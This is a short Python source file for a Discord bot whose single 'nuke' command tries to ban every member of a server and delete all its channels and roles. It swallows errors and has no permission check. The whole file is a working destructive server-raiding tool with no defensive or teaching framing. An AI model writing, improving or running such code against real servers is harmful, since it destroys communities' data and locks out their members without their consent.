import discord
from discord.ext import commands
from config import settings
import os
import random
from discord.ext.commands import has_permissions, MissingPermissions

from discord.utils import get

bot = commands.Bot(command_prefix = settings['prefix'])

@bot.command()
async def nuke (ctx):
    
    for i in ctx.guild.members:
        
        try:
            await i.ban ()
        except:
            print ("cant to ban")
            
    for j in ctx.guild.channels:
        
        try:
            await j.delete ()
        except:
            print ("cant to delete")
    
    for k in ctx.guild.roles:
        
        try:
            await k.delete ()
        except:
            print ("cant to delete")
        
token = os.environ.get('BOT_TOKEN')
bot.run (str(token))
